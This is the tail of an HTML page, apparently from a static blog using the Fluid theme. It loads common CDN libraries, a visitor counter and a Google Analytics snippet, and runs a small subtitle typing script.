<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>


</body>
</html>
